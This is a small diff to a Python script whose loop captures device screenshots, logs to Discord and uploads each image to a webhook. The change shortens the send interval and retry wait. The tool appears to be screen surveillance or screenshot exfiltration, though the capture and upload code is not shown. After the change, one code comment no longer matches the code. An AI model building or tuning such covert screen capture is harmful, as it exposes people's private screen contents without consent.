@@ -48,7 +48,7 @@ def auto_send(interval=10, DEVICE_NAME=None):
             
             if not image:
                 log_discord("No screenshot captured from device.", "WARN")
-                time.sleep(interval * 2)  # Wait longer before trying again
+                time.sleep(interval)  # Wait longer before trying again
                 continue
 
             # Send screenshot to webhook as file
@@ -68,4 +68,4 @@ def auto_send(interval=10, DEVICE_NAME=None):
 
 if __name__ == "__main__":
     DEVICE_NAME = get_device_name()
-    auto_send(interval=10, DEVICE_NAME=DEVICE_NAME)
+    auto_send(interval=5, DEVICE_NAME=DEVICE_NAME)
